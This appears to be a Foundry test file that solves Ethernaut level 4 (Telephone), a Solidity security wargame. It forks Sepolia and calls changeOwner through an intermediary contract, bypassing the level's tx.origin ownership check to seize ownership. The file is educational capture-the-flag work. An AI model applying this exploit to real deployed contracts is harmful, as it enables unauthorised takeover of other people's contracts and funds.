// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../../src/levels/04-Telephone/Telephone.sol";

contract ContractTest is Test {
    Telephone level4 =
        Telephone(payable(0x5610ca330A030462B9609F74925e5EA86AC08eec));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));

        vm.createSelectFork(vm.rpcUrl("sepolia"));
        vm.label(address(this), "Attacker");
        vm.label(
            address(0x5610ca330A030462B9609F74925e5EA86AC08eec),
            "Ethernaut04"
        );
    }

    function testEthernaut04() public {
        level4.owner(); // 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446
        level4.changeOwner(address(this));
        level4.owner(); // address(this)
    }

    receive() external payable {}
}
